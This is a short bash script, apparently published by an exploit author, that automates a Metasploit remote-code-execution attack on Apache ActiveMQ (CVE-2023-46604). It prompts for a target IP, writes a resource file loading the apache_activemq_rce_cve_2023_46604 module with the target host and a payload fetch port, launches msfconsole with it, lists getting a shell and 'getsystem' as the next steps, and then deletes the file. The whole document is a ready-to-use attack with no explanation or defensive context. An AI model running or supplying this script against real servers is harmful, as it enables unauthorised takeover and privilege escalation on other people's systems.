#!/usr/bin/bash
# @nu11secur1ty-2023 - automated exploit with Metasploit

author()
{
  echo "+------------------------------------------------------+"
  printf "| %-40s             |\n" "`date`"
  echo "|                                                      |"
  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"              
  echo "| Apache ActiveMQ vulnerability Exploit                |"
  echo "+------------------------------------------------------+"
}
author "@nu11secur1ty-2023-automated exploit with Metasploit"


echo "Give the target IP:"
echo
read ip_na_tupungera
da_go_nabia_v_chovkite_vi="use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOST $ip_na_tupungera
set fetch_srvport 8081
exploit
"
cat > poc.rc <<EOF
$da_go_nabia_v_chovkite_vi
EOF
    
# Exploit:
msfconsole -r poc.rc
# shell
# getsystem

# cleaning
read -p "Press enter to cleaning"
rm poc.rc
